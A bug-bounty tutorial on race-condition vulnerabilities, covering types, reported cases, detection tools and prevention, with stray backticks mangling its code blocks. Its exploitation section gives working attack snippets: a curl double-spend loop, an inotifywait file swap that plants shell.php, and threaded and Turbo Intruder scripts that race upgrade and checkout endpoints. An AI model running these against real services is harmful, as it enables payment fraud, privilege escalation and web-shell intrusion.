
# 🧠 Race Conditions in Bug Bounty (Advanced & Beast Mode Guide)

---

## 🔹 What is a Race Condition?

A **race condition** occurs when multiple operations are executed **concurrently** and the final outcome depends on the **timing or sequence** of these operations. In security, it allows attackers to manipulate logic before another process finishes—often bypassing checks or duplicating actions (e.g., funds, tokens, privileges).

---

## 🔹 Types of Race Conditions (💥 Bug Bounty Relevant)

|Type|Description|Real-world Impact|
|---|---|---|
|**TOCTOU (Time-of-Check to Time-of-Use)**|State is validated, but changes before action is performed|File permission bypass, privilege escalation|
|**Concurrency Race**|Multiple parallel threads/processes compete for shared resource|Account takeover, double-spending|
|**Signal-based Race**|Race created using Unix signals like `SIGSTOP`/`SIGCONT`|Bypass of security mechanisms|
|**Multi-threaded Race**|Threads share state/data without proper locking|Logic bypass, multi-use of single-use endpoints|
|**Fork-Exec Race**|Race using `fork()` and `exec()` calls|Execute malicious processes before security check|
|**Shared Resource Race**|Race in shared memory, DB, cache, session, etc.|DB inconsistency, session hijack|

---

## 🔹 Real-World Race Vulnerabilities (Bug Bounty Examples)

|Target|Vulnerability|Impact|
|---|---|---|
|**Shopify**|Double-order placement by racing checkout|$50k payout|
|**HackerOne**|Repeated reward redemption via API race|Logic bypass|
|**Uber**|Concurrent driver payout requests|Double payment|
|**Banking Apps**|Balance not updated fast enough|Money duplication|

---

## 🔹 🧪 How to Detect Race Conditions

### Manual Testing

- Identify **critical logic endpoints**:
    
    - Payment, coupon, checkout
        
    - File uploads
        
    - Privilege actions
        
- Look for **state-check + action** patterns
    
- Reuse same token/session across concurrent requests
    

### Tools

- **Turbo Intruder (Burp Suite extension)**
    
    - Ultra-fast HTTP smuggling / race testing
        
- **RaceTheWeb** (automated race condition scanner)
    
- **Intruder in Burp** (using `clusterbomb` or `pitchfork`)
    
- **Parallel Python Scripts** using `threading` or `multiprocessing`
    

---

## 🔹 🔫 Exploitation Techniques

### 💣 1. Double-Spend Attack


``Send multiple POSTs to purchase item
`for i in {1..10}; do
 `` curl -X POST -d 'item_id=123' https://target.com/api/buy &
`done
`wait


> Effect: You bought the item once, but charged multiple times or got duplicates.

---

### 🧨 2. TOCTOU on File Upload

1. Upload file → App checks if it’s a `.jpg`
    
2. Before final move/save, replace with `.php`
    
3. Now server saves `.php` thinking it's `.jpg`
    

Use:

`inotifywait -m /tmp/uploads -e create |
  `while read path file; do
    `cp shell.php /tmp/uploads/$file
  `done


---

### 🪓 3. User Privilege Escalation via Race
`Simulate 20 concurrent requests to role upgrade API
`import threading
`import requests

`def upgrade():
   ` requests.post("https://target.com/api/upgrade", cookies={'session':'XYZ'})

`threads = []
`for i in range(20):
    `t = threading.Thread(target=upgrade)
   ` t.start()
    `threads.append(t)

`for t in threads:
   ` t.join()


---

## 🔐 Advanced Attack Surfaces for Race Conditions

|Component|Exploit Vector|
|---|---|
|**Payment Gateways**|Race payment confirmation|
|**Coupon Redemption**|Use once-only coupons multiple times|
|**File Systems**|Replace file during upload|
|**JWT/Session Validation**|Race to use expired tokens|
|**Database Writes**|Dirty reads, money duplication|
|**Mobile APIs**|Often miss concurrency handling|

---

## 📖 Beast Techniques for Hardcore Hunters

### ✅ Use Turbo Intruder for High-Speed Race

Turbo Intruder script to race checkout endpoint:
`def queueRequests(target, wordlists):
    `engine = RequestEngine(endpoint=target.endpoint,
        `concurrentConnections=50,
        `requestsPerConnection=100,
        `pipeline=False
   ` )

    `for i in range(50):
    `    engine.queue(target.req)

`def handleResponse(req, interesting):
    `if b'success' in req.response:
       ` print('Potential race win!', req.response)
`
---

### 🛠 Combine Race + Logic + IDOR

- Use IDOR to target another user's action (e.g., password reset)
    
- Use race to trigger multiple executions of that action
    
- Use logic bug to complete the bypass
    

---

## 🧩 Prevention Techniques (Dev-side)

|Technique|Description|
|---|---|
|**Atomic Operations**|Use `transactions` in DB|
|**Locking (Mutex/Semaphores)**|Prevent concurrent access|
|**Check-then-Act Atomically**|Avoid TOCTOU|
|**Idempotency Tokens**|Allow action only once per token|
|**Rate Limiting**|Block mass requests|
|**Queueing Systems**|Serialize sensitive operations|
## 📂 Real-World Reports (HackerOne / Bugcrowd)

- Shopify - Double Payment via Race Condition`https://hackerone.com/reports/1024784
    
- Uber - Bonus Abuse`https://hackerone.com/reports/231502
    
- GitHub - Repo Visibility Change Race`https://hackerone.com/reports/381194
    
- Slack - Coupon Reuse Race`https://hackerone.com/reports/118850